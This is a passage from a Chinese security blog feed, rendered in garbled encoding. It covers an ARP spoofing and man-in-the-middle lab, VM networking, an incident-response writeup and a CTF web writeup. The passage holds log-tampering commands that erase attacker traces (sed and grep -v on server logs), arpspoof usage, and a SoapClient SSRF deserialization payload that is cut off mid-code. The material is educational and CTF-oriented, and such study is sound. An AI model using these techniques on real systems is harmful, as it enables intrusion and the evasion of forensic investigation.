class="built_in">log</span>/mysql/mysql_error.<span class="built_in">log</span></span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/10.0.0.55/g&#x27;</span> â€“i /var/<span class="built_in">log</span>/mysql/mysql_slow.<span class="built_in">log</span></span><br><span class="line"></span><br><span class="line">sed <span class="string">&#x27;s/192.168.100.101/192.168.1.4/g&#x27;</span> â€“i /var/<span class="built_in">log</span>/apache/php_error.<span class="built_in">log</span></span><br></pre></td></tr></table></figure><p>æ¸…é™¤éƒ¨åˆ†ç›¸å…³æ—¥å¿—ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨grep -væ¥æŠŠæˆ‘ä»¬çš„ç›¸å…³ä¿¡æ¯åˆ é™¤</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/nginx/access.log | grep -v evil.php &gt; tmp.log</span><br><span class="line"><span class="comment"># æŠŠä¿®æ”¹è¿‡çš„æ—¥å¿—è¦†ç›–åˆ°åŸæ—¥å¿—æ–‡ä»¶</span></span><br><span class="line"><span class="built_in">cat</span> tmp.log &gt; /var/log/nginx/access.log/</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://cloud.tencent.com/developer/article/1698537">https://cloud.tencent.com/developer/article/1698537</a></p><p><a href="https://www.freebuf.com/articles/system/266458.html">https://www.freebuf.com/articles/system/266458.html</a></p><p><a href="https://www.cnblogs.com/xiaozi/p/13648156.html">https://www.cnblogs.com/xiaozi/p/13648156.html</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ARPåè®®</title>
      <link href="/2023/06/01/ARP%E5%8D%8F%E8%AE%AE/"/>
      <url>/2023/06/01/ARP%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="ARPåè®®æ˜¯ä»€ä¹ˆ"><a href="#ARPåè®®æ˜¯ä»€ä¹ˆ" class="headerlink" title="ARPåè®®æ˜¯ä»€ä¹ˆ"></a>ARPåè®®æ˜¯ä»€ä¹ˆ</h2><p>â€‹ARP åè®®æ˜¯åœ°å€è§£æåè®®ã€‚å®ƒçš„ä½œç”¨æ˜¯ï¼Œé€šè¿‡IPåœ°å€ï¼ˆèº«ä»½è¯å·ï¼‰ï¼Œé—®å‡ºMACåœ°å€ï¼ˆåå­—ï¼‰ã€‚</p><p>â€‹æ¯”å¦‚è¯´ï¼Œä¸€ä¸ªç½‘ç»œï¼Œæœ‰Aã€Bã€C å’Œ Då››ä¸ªè®¾å¤‡ï¼Œè¿˜æœ‰ä¸€ä¸ªç‰¹æ®Šçš„è®¾å¤‡ï¼Œå®ƒæ˜¯è·¯ç”±å™¨ã€‚æ¯ä¸ªè®¾å¤‡æœ‰ IP åœ°å€å’Œ MAC åœ°å€ã€‚</p><p><img src="/../images/1658199491_62d61dc3accbdb9a8b4c3-1694328189527.jpg!small" alt="img"><br>    å‡è®¾ï¼Œè®¾å¤‡A éœ€è¦å‘é€æ•°æ®åŒ…ç»™è®¾å¤‡Cï¼Œè®¾å¤‡Açš„åº”ç”¨ç¨‹åºåªçŸ¥é“è¦å‘é€æ•°æ®ç»™10.0.2.6è¿™ä¸ªipï¼Œä½†æ˜¯å‘ä¸å‡ºå»ã€‚</p><p>è¿™æ˜¯å› ä¸ºï¼ŒIPåœ°å€ç±»ä¼¼èº«ä»½è¯å·ï¼Œåœ¨å…¨å›½èŒƒå›´å†…ï¼Œå®ƒå¾ˆå¥½ç”¨ï¼Œä½†åœ¨å®¶åº­èŒƒå›´å†…ä¸çµã€‚MACç±»ä¼¼åå­—ï¼Œåœ¨å…¨å›½èŒƒå›´å†…ä¸çµï¼Œä½†å®¶åº­å†…éƒ¨ï¼Œè¿˜å¾—é è¿™ä¸ªã€‚</p><p>â€‹åŒæ ·ï¼Œå±€åŸŸç½‘å†…éƒ¨é€šä¿¡ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡æ™®é€šäºŒå±‚äº¤æ¢æœºé€šä¿¡ï¼ŒIP(èº«ä»½è¯å·)ä¸çµï¼Œå¾—ä¾é MAC(åå­—)ã€‚Aå¿…é¡»çŸ¥é“10.0.2.6çš„MACåœ°å€ï¼Œæ‰èƒ½å°†æ•°æ®åŒ…å‘é€å‡ºå»ã€‚ç„¶è€Œï¼Œè®¾å¤‡Aæ€ä¹ˆçŸ¥é“è®¾å¤‡Cçš„MACå‘¢ï¼Ÿè¿™å°±è¦ä¾é  ARP åè®®ã€‚</p><h2 id="ARPåè®®å¦‚ä½•å®ç°"><a href="#ARPåè®®å¦‚ä½•å®ç°" class="headerlink" title="ARPåè®®å¦‚ä½•å®ç°"></a>ARPåè®®å¦‚ä½•å®ç°</h2><p>â€‹è®¾å¤‡Aå‘é€ä¸€ä¸ªå¹¿æ’­åŒ…ï¼Œå®ƒå°±æ˜¯ARP åŒ…ï¼Œé—®æ‰€æœ‰è®¾å¤‡ï¼š 10.0.2.6(èº«ä»½è¯å·)æ˜¯è°çš„ï¼Ÿæˆ–è®¸æœ‰å–„äºæ€è€ƒçš„äººä¼šé—®ï¼Œæ­¤æ—¶Aä¸çŸ¥é“å…¶ä»–æœºå™¨çš„macåœ°å€ï¼Œæ€ä¹ˆå‘æ•°æ®åŒ…ï¼Ÿæˆ‘å›ç­”ï¼šå¹¿æ’­åŒ…æ˜¯æ™®å‘ï¼Œæ—¢ç„¶æ™®å‘ï¼Œå½“ç„¶æ— éœ€çŸ¥é“æ¥æ”¶æ–¹çš„macåœ°å€ã€‚</p><p><img src="/../images/1658199518_62d61ddead52e7492752c-1694328193352.jpg!small" alt="img"><br>    å…¶ä»–è®¾å¤‡éƒ½ä¸äºˆç†ç¬ï¼Œè®¾å¤‡CçŸ¥é“è‡ªå·±çš„IPæ˜¯10.0.2.6ï¼Œæ‰€ä»¥ï¼Œå®ƒç«‹å³åšå‡ºå›åº”ã€‚</p><p>â€‹æ­£å¸¸æƒ…å†µä¸‹ï¼Œå…¶ä»–çš„è®¾å¤‡éƒ½é»˜ä¸ä½œå£°ï¼Œåªæœ‰è®¾å¤‡Cï¼Œå®ƒä¼šå‘å‡ºåº”ç­”åŒ…ã€‚å–„äºæ€è€ƒçš„äººæ­¤æ—¶åˆä¼šé—®ï¼šCä¸çŸ¥é“Açš„macåœ°å€ï¼Œæ€ä¹ˆå›åº”ï¼Ÿé”™ï¼šAå‘é€çš„å¹¿æ’­åŒ…ä¸­å¸¦æœ‰è‡ªå·±çš„macåœ°å€ï¼Œæ‰€ä»¥ï¼ŒCæ­¤æ—¶å·²ç»æœ‰äº†Açš„macåœ°å€ã€‚å›åº”åŒ…å°±åƒä¸€å¼ èº«ä»½è¯ï¼šä¸€è¡Œæ˜¯èº«ä»½è¯å·ipï¼Œä¸‹ä¸€è¡Œæ˜¯å§“åmacã€‚å°±è¿™æ ·ï¼Œè®¾å¤‡Aé€šè¿‡è¯¢é—®ï¼Œæ‹¿åˆ°äº†è®¾å¤‡Cçš„MACï¼ŒäºŒè€…å°±å¯ä»¥åœ¨å±€åŸŸç½‘ä¸­è¿›è¡Œé€šä¿¡äº†ã€‚</p><p><img src="/../images/1658199555_62d61e035ce70a9b1f624-1694328196273.jpg!small" alt="img"><br>    è¿™é‡Œå°±å‡ºç°å¦ä¸€ä¸ªé—®é¢˜ï¼šæ˜¯ä¸æ˜¯æ¯å‘é€ä¸€æ¬¡éƒ½å¾—ç»è¿‡å¹¿æ’­ -&gt; å°è£… ARP å“åº” -&gt; è¿”å›ç»™ä¸»æœºè¿™ä¸€ç³»åˆ—æµç¨‹å‘¢ï¼Ÿ</p><p>â€‹ç­”æ¡ˆæ˜¯ï¼šARPè¡¨</p><p>â€‹ä¸»æœºé€šè¿‡æŠŠç¬¬ä¸€æ¬¡ ARP è·å–åˆ°çš„ MAC åœ°å€ä½œä¸º IP å¯¹ MAC çš„æ˜ å°„å…³ç³»åˆ°ä¸€ä¸ª ARP ç¼“å­˜è¡¨ä¸­ï¼Œä¸‹ä¸€æ¬¡å†å‘è¿™ä¸ªåœ°å€å‘é€æ•°æ®æŠ¥æ—¶å°±ä¸å†éœ€è¦é‡æ–°å‘é€ ARP è¯·æ±‚äº†ï¼Œè€Œæ˜¯ç›´æ¥ä½¿ç”¨è¿™ä¸ªç¼“å­˜è¡¨ä¸­çš„ MAC åœ°å€è¿›è¡Œæ•°æ®æŠ¥çš„å‘é€ã€‚</p><h2 id="ARPæ•°æ®åŒ…"><a href="#ARPæ•°æ®åŒ…" class="headerlink" title="ARPæ•°æ®åŒ…"></a>ARPæ•°æ®åŒ…</h2><p>å®éªŒç¯å¢ƒï¼šå®¿ä¸»æœºwindow10ï¼Œè™šæ‹Ÿæœºkaiiï¼ˆnetè¿æ¥ï¼‰</p><p>å·¥å…·ï¼šwireshark</p><p>é€‰æ‹©æ•è·VMnet8ç½‘å¡ã€‚</p><p>åœ¨å®¿ä¸»æœºä¸Š<code>ping 192.168.244.128</code> ï¼ˆping è™šæ‹Ÿæœºipåœ°å€ï¼‰ï¼Œè¿‡æ»¤ARPåè®®å¾—åˆ°</p><p><img src="/../images/image-20220929154825833-1694328200254.png" alt="image-20220929154825833"></p><p>å¯ä»¥çœ‹åˆ°infoçš„ä¿¡æ¯å…¶å®å°±å‘Šè¯‰æˆ‘ä»¬äº†ARPåè®®æ˜¯ç”¨æ¥å¹²å˜›çš„ã€‚</p><p>æ•°æ®åŒ…å†…å®¹ï¼Œä»¥ARPè¯·æ±‚ä¸ºä¾‹ï¼š</p><p><img src="/../images/image-20220929155056878-1694328203114.png" alt="image-20220929155056878"></p><ol><li><p>ç¬¬ä¸€å¸§æè¿°äº†ARPæ•°æ®åŒ…çš„é•¿åº¦ï¼Œæ—¶é—´ï¼Œç±»å‹ç­‰ä¿¡æ¯ã€‚</p><p><img src="/../images/image-20220929155151496.png" alt="image-20220929155056878"></p></li><li><p>ç¬¬äºŒå¸§æè¿°äº†æºmacåœ°å€å’Œç›®æ ‡macåœ°å€</p><p>å…¶ä¸­ç›®çš„åœ°å€<code>ff:ff:ff:ff:ff:ff</code>ä¸ºå¹¿æ’­åœ°å€</p><p><img src="/../images/image-20220929155258245.png" alt="image-20220929155056878"></p></li><li><p>ç¬¬ä¸‰å¸§</p><blockquote><p>å¼•ç”¨å›¾ç‰‡</p></blockquote><p><img src="/../images/1657258276_62c7c1240a8a324d48f7b-1694328215300.png!small" alt="1657258276_62c7c1240a8a324d48f7b.png!small"></p></li></ol><p>ARPå“åº”åŒ…ä¸»è¦ä¸åŒç‚¹å°±åœ¨äºARPæ•°æ®åŒ…ç±»å‹ä»¥åŠæºï¼Œç›®æ ‡åœ°å€ã€‚</p><p><img src="/../images/image-20220929155642126-1694328218908.png" alt="image-20220929155642126"></p><h2 id="ARPåè®®æ¢æµ‹ä¸»æœº"><a href="#ARPåè®®æ¢æµ‹ä¸»æœº" class="headerlink" title="ARPåè®®æ¢æµ‹ä¸»æœº"></a>ARPåè®®æ¢æµ‹ä¸»æœº</h2><blockquote><p>å› ä¸ºARPçš„å·¥ä½œæµç¨‹ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ¥æ¢æµ‹ä¸»æœºã€‚</p></blockquote><p>ä½¿ç”¨netdiscoverå·¥å…·è¿›è¡Œæ¢æµ‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.244.1/24</span><br></pre></td></tr></table></figure><p>ä¸‹å›¾ä¸ºå¦ä¸€å°è™šæ‹Ÿæœºubuntuçš„ipåœ°å€</p><p><img src="/../images/image-20220929150651695-1694328222991.png" alt="image-20220929150651695"></p><p>ä¸‹å›¾ä¸ºå‘½ä»¤æ‰§è¡Œç»“æœ</p><p><img src="/../images/image-20220929150631230-1694328225340.png" alt="image-20220929150631230"></p><p>192.168.244.1ä¸ºæœ¬æœº</p><p>192.168.244.2ä¸ºVMç½‘å…³</p><p>192.168.244.129ä¸ºåŒä¸€å±€åŸŸç½‘ä¸‹çš„ä¸»æœº</p><p>192.168.244.254ä¸ºVMï¼Ÿ</p><h2 id="ARPæ”»å‡»"><a href="#ARPæ”»å‡»" class="headerlink" title="ARPæ”»å‡»"></a>ARPæ”»å‡»</h2><h3 id="æ¬ºéª—æ”»å‡»"><a href="#æ¬ºéª—æ”»å‡»" class="headerlink" title="æ¬ºéª—æ”»å‡»"></a>æ¬ºéª—æ”»å‡»</h3><h4 id="äº§ç”ŸåŸå› "><a href="#äº§ç”ŸåŸå› " class="headerlink" title="äº§ç”ŸåŸå› "></a>äº§ç”ŸåŸå› </h4><p>ARPçš„ç‰¹æ€§</p><blockquote><p>è®¾å¤‡å°±ç®—æ²¡æœ‰ä¸»åŠ¨å»è¯¢é—®ï¼ˆå‘å¹¿æ’­åŒ…ï¼‰ï¼Œä¹Ÿä¼šæ¥æ”¶åˆ«äººä¸»åŠ¨å‘æ¥çš„èº«ä»½è¯Šå¡ï¼ˆARPå›åº”åŒ…ï¼‰ã€‚</p><p>å¹¶ä¸”æ¥æ”¶æ—¶ä¸ä¼šå»åˆ¤æ–­çœŸå‡ï¼Œè€Œæ˜¯ç›´æ¥ä¿å­˜åˆ°ARPè¡¨ä¸­ã€‚</p></blockquote><h4 id="æ¬ºéª—ä¸»æœº"><a href="#æ¬ºéª—ä¸»æœº" class="headerlink" title="æ¬ºéª—ä¸»æœº"></a>æ¬ºéª—ä¸»æœº</h4><p>Victimï¼šè™šæ‹Ÿæœºububtuæ­£å¸¸è”ç½‘</p><p><img src="/../images/image-20220929151256047-1694328229283.png" alt="image-20220929151256047"></p><p>hackerï¼škaliæœºä½¿ç”¨arpspoofå·¥å…·è¿›è¡ŒARPæ¬ºéª—æ”»å‡»</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arpspoof -i ç½‘å¡å -t  ç›®æ ‡ä¸»æœº  è·¯ç”±å™¨</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220929151906826-1694328232862.png" alt="image-20220929151906826"></p><p>å‘½ä»¤çš„ç»“æœå°±æ˜¯è®©Victimçš„ARPè¡¨ä¸­å­˜å‚¨çš„è·¯ç”±å™¨macåœ°å€å˜ä¸ºhackerçš„macåœ°å€ï¼Œå³å‘é€çš„æ•°æ®åŒ…ä¼šåˆ°hackerä¸»æœºï¼Œè€Œä¸æ˜¯åˆ°è·¯ç”±å™¨ã€‚</p><p>ä»ä¸‹å›¾å¯ä»¥çœ‹åˆ°victimæ— æ³•è®¿é—®ç½‘ç«™ï¼Œå¹¶ä¸”é€šè¿‡å‘½ä»¤<code>arp -a</code>æŸ¥çœ‹ARPè¡¨ä¼šå‘ç°VMç½‘å…³ï¼ˆ192.168.244.2ï¼‰çš„macåœ°å€å’Œhackerçš„macåœ°å€æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥ARPæ¬ºéª—æ”»å‡»æˆåŠŸäº†ã€‚</p><p><img src="/../images/image-20220929151847725-1694328235790.png" alt="image-20220929151847725"></p><h4 id="ä¸­é—´äººæ”»å‡»â€“æ¬ºéª—ç½‘å…³å’Œä¸»æœº"><a href="#ä¸­é—´äººæ”»å‡»â€“æ¬ºéª—ç½‘å…³å’Œä¸»æœº" class="headerlink" title="ä¸­é—´äººæ”»å‡»â€“æ¬ºéª—ç½‘å…³å’Œä¸»æœº"></a>ä¸­é—´äººæ”»å‡»â€“æ¬ºéª—ç½‘å…³å’Œä¸»æœº</h4><p>â€‹åœ¨ä¸Šé¢çš„åŸºç¡€ä¸Šï¼Œhackerè¿˜å¯ä»¥å†å¯¹è·¯ç”±å™¨è¿›è¡ŒARPæ¬ºéª—æ”»å‡»ï¼Œè®©è·¯ç”±å™¨ä¸­Victimçš„ipæ‰€å¯¹åº”çš„MACåœ°å€å˜ä¸ºhackerçš„MACåœ°å€ï¼Œè¿™æ ·å½“Victimå‘é€æ•°æ®åŒ…çš„æ—¶å€™å°±ä¼šå…ˆå‘é€åˆ°hackeræ‰‹ä¸Šï¼Œhackerå¯ä»¥æŠŠæ•°æ®åŒ…å†ç»™è·¯ç”±å™¨ï¼Œå½“è·¯ç”±å™¨æ”¶åˆ°å“åº”çš„æ•°æ®åŒ…æ—¶ï¼Œå°±ä¼šè½¬å‘ç»™hackerï¼Œè¿™æ ·hackerå°±èƒ½å¤Ÿç›‘æ§å¹¶æ›´æ”¹Victimçš„é€šä¿¡äº†ã€‚</p><p><img src="/../images/1658199907_62d61f63394a1350fb977-1694328238721.jpg!small" alt="img"></p><h3 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h3><ul><li>ç»‘å®šmacåœ°å€</li><li>ä½¿ç”¨é™æ€arpç¼“å­˜è¡¨</li></ul><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://www.freebuf.com/vuls/338603.html">ARPåè®®</a></p><p><a href="https://www.freebuf.com/articles/network/339512.html">ARPæ¬ºéª—</a></p>]]></content>
      
      
      <categories>
          
          <category> è®¡ç®—æœºåŸºç¡€ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è™šæ‹Ÿæœºç½‘ç»œ</title>
      <link href="/2023/06/01/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
      <url>/2023/06/01/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<p><a href="https://wxler.github.io/2021/02/02/221724/">https://wxler.github.io/2021/02/02/221724/</a></p><p>VMç½‘ç»œé…ç½®</p><p><img src="/../images/image-20221130222647414-1694328507984.png" alt="image-20221004160123895"></p><p>è™šæ‹Ÿæœºwin10æ‰“å°çš„ç½‘ç»œé…ç½®ä¿¡æ¯</p><p><img src="/../images/image-20221130222502342-1694328517756.png" alt="image-20221004160123895"></p><p>å®¿ä¸»æœºç½‘ç»œè®¾å¤‡</p><p><img src="/../images/image-20221130223635941-1694328542057.png" alt="image-20221004160123895"></p><p>NATæ¨¡å¼</p><p><img src="/../images/20210202174313-1694328313538.png" alt="img"></p><p>æ¡¥æ¥æ¨¡å¼</p><p><img src="/../images/20210202175608-1694328316191.png" alt="img"></p><p>ä»…ä¸»æœºæ¨¡å¼</p><p><img src="/../images/20210202181232-1694328318816.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> è®¡ç®—æœºåŸºç¡€ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bugku åº”æ€¥å“åº”</title>
      <link href="/2023/05/31/bugku%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/2023/05/31/bugku%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<h3 id="jsåŠ«æŒ"><a href="#jsåŠ«æŒ" class="headerlink" title="jsåŠ«æŒ"></a>jsåŠ«æŒ</h3><p><img src="/../images/image-20230402174621652-1686151030355.png" alt="image-20230402174621652"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat `find /var/www/html -name &quot;6127418cad73c.php&quot;`</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230402174633296-1686151030358.png" alt="image-20230402174633296"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find . | xargs grep -ri &#x27;&lt;script type=&quot;text/javascript&quot;&gt;&#x27; -l | sort | uniq -c</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é€šè¿‡xssçš„ç‰¹å¾å†…å®¹æ¥å®šä½å¯ç–‘æ–‡ä»¶</p><h3 id="åå¼¹shellåé—¨"><a href="#åå¼¹shellåé—¨" class="headerlink" title="åå¼¹shellåé—¨"></a>åå¼¹shellåé—¨</h3><p><img src="/../images/image-20230402180138838-1686151030359.png" alt="image-20230402180138838"></p><p><img src="/../images/image-20230402180201438-1686151030359.png" alt="image-20230402180201438"></p><p>å¤„ç†ï¼š</p><p>åˆ é™¤æ–‡ä»¶</p><p>æ€æ‰è¿›ç¨‹</p><h3 id="å‘½ä»¤åŠ«æŒ"><a href="#å‘½ä»¤åŠ«æŒ" class="headerlink" title="å‘½ä»¤åŠ«æŒ"></a>å‘½ä»¤åŠ«æŒ</h3><p><img src="/../images/image-20230402180338299-1686151030359.png" alt="image-20230402180338299"></p><h3 id="æ•°æ®åº“ä¿®å¤"><a href="#æ•°æ®åº“ä¿®å¤" class="headerlink" title="æ•°æ®åº“ä¿®å¤"></a>æ•°æ®åº“ä¿®å¤</h3><p><a href="https://www.cnblogs.com/richardzhu/p/3318595.html">MySQLä¹‹æƒé™ç®¡ç† - Iâ€™m Me! - åšå®¢å›­</a></p><p><img src="/../images/image-20230402181706798-1686151030359.png" alt="image-20230402181706798"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">revoke file on *.* from &#x27;root&#x27;@&#x27;localhost&#x27;; # æ”¶å›æ–‡ä»¶æƒé™</span><br><span class="line">set global general_log = off; # ä¸å¯ç”¨æ—¥å¿—</span><br><span class="line">flush privileges; # åˆ·æ–°æƒé™</span><br></pre></td></tr></table></figure><h3 id="ç”¨æˆ·åˆ é™¤"><a href="#ç”¨æˆ·åˆ é™¤" class="headerlink" title="ç”¨æˆ·åˆ é™¤"></a>ç”¨æˆ·åˆ é™¤</h3><p><img src="/../images/image-20230402183352852-1686151030359.png" alt="image-20230402183352852"></p><p>ç›´æ¥åˆ å°±å®Œäº‹äº†</p><h3 id="é¦–æ¬¡æ”»å‡»"><a href="#é¦–æ¬¡æ”»å‡»" class="headerlink" title="é¦–æ¬¡æ”»å‡»"></a>é¦–æ¬¡æ”»å‡»</h3><p>ç­›é€‰äº†ipå’ŒçŠ¶æ€ç ï¼Œç„¶åæ‰¾çš„ã€‚</p><p><img src="/../images/image-20230402190333789-1686151030360.png" alt="image-20230402190333789"></p><p><img src="/../images/image-20230403114840046-1686151030360.png" alt="image-20230403114840046"></p><p><img src="/../images/image-20230403114851126-1686151030360.png" alt="image-20230403114851126"></p><p>å‘ç°å®‰è£…äº†phpmyadminï¼Œé‚£ä¹ˆå¾ˆå¤§æ¦‚ç‡æ˜¯é€šè¿‡æ•°æ®åº“æ”»å…¥çš„ã€‚</p><p><img src="/../images/image-20230403115435870-1686151030360.png" alt="image-20230403115435870"></p><p>ç™»å½•phpmyadminåå°æŸ¥çœ‹äºŒè¿›åˆ¶æ—¥å¿—ï¼Œå¾ˆæ˜æ˜¾çœ‹å‡ºæ¥è¿™ä¸ªæ˜¯ä½¿ç”¨udfåˆ›å»ºæ¶æ„å‡½æ•°sys_evalææƒ</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># æŸ¥çœ‹è¿™äº›ç›®å½•æ˜¯å¦æœ‰æ–‡ä»¶ï¼Œå¾ˆå¯èƒ½æœ‰ææƒ</span><br><span class="line">mysql\lib\plugin</span><br><span class="line"></span><br><span class="line">c:<span class="operator">/</span>windows<span class="operator">/</span>system32<span class="operator">/</span>wbem<span class="operator">/</span>mof<span class="operator">/</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230403115606245-1686151030360.png" alt="image-20230403115606245"></p><p>ä¿®å¤</p><p><img src="/../images/image-20230403123447079-1686151030360.png" alt="image-20230403123447079"></p><p>åœ¨my.iniä¸­æ·»åŠ å¦‚ä¸Šè®¾ç½®ï¼Œä¸å…è®¸å¯¼å…¥å’Œå¯¼å‡ºã€‚</p><p>è¿›è¡Œmysqlæ—¥å¿—åˆ†æï¼Œé€šè¿‡å®šä½sys_evalæ¥æŸ¥æ‰¾æ”»å‡»è€…è¿›è¡Œäº†å“ªäº›æ“ä½œ</p><p><img src="/../images/image-20230403120034903-1686151030360.png" alt="image-20230403120034903"></p><p>åªè¿›è¡Œäº†æ·»åŠ ç”¨æˆ·çš„æ“ä½œ</p><p><img src="/../images/image-20230403120253606-1686151030360.png" alt="image-20230403120253606"></p><p>ç›´æ¥åˆ é™¤è¯¥ç”¨æˆ·</p><p><img src="/../images/image-20230403120327311-1686151030360.png" alt="image-20230403120327311"></p><p>æŸ¥æ€websehll</p><p>ä½¿ç”¨æ—¥å¿—åˆ†æå·¥å…·</p><p>ï¼ˆè·Ÿè¸ªipçš„è®¿é—®ï¼‰</p><p><img src="/../images/image-20230403122636304-1686151030360.png" alt="image-20230403122636304"></p><p><img src="/../images/image-20230403122604222-1686151030360.png" alt="image-20230403122604222"></p><p>åé—¨æŸ¥æ€</p><p><img src="/../images/image-20230403124818101-1686151030361.png" alt="image-20230403124818101"></p><p><img src="/../images/image-20230403124754804-1686151030361.png" alt="image-20230403124754804"></p><p>æœ¨é©¬ä½ç½®åœ¨å¯åŠ¨é¡¹</p><p><img src="/../images/image-20230403124903028-1686151030361.png" alt="image-20230403124903028"></p><p><img src="/../images/image-20230403124408821-1686151030361.png" alt="image-20230403124408821"></p><p>é€šè¿‡èµ„æºç›‘è§†å™¨å¾—åˆ°è¯¥æœ¨é©¬å¤–è”åœ°å€</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2022 å®‰æ´µæ¯</title>
      <link href="/2023/05/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/"/>
      <url>/2023/05/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><h4 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><p>ä¸buuâ€“bestphpâ€˜s revengeå·®ä¸å¤š</p><ul><li>session+ååºåˆ—åŒ–</li><li>åŸç”Ÿç±»SSRF+æ–‡ä»¶æ“ä½œ</li></ul><h4 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h4><p>ç¬¬ä¸€æ­¥ï¼Œè®¾ç½®phpçš„sessionè§£æå™¨ï¼Œä½¿å¾—ä¸‹ä¸€æ¬¡ä¼šè¯æ—¶sessionä¸­ä¿å­˜çš„æ˜¯æ„é€ å¥½çš„SoapClientå¯¹è±¡ã€‚</p><p>SoapClientå¯¹è±¡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># $target = &quot;http://127.0.0.1/flag.php?a=GlobIterator&amp;b=/f*&quot;; æŸ¥æ‰¾flagæ–‡ä»¶å</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/flag.php?a=SplFileObject&amp;b=/f1111llllllaagg&quot;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=123456789&#x27;</span> <span class="comment"># éšä¾¿ç»™ä¸€ä¸ª</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">  <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;khaz^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128162813314-1686150400485.png" alt="image-20221128162813314"></p><p>ç¬¬äºŒæ­¥ï¼Œååºåˆ—åŒ–è§¦å‘SoapClientçš„callæ–¹æ³•ï¼Œä»è€Œå¯¼è‡´SSRFï¼Œä»è€Œå°†flagä¿å­˜åˆ°SSRFè¯·æ±‚å¯¹åº”çš„sessionä¸­ã€‚</p><p>popï¼š</p><p>B::destruct   â†’    C::toString   â†’   A::invoke    â†’   C::uwant</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> 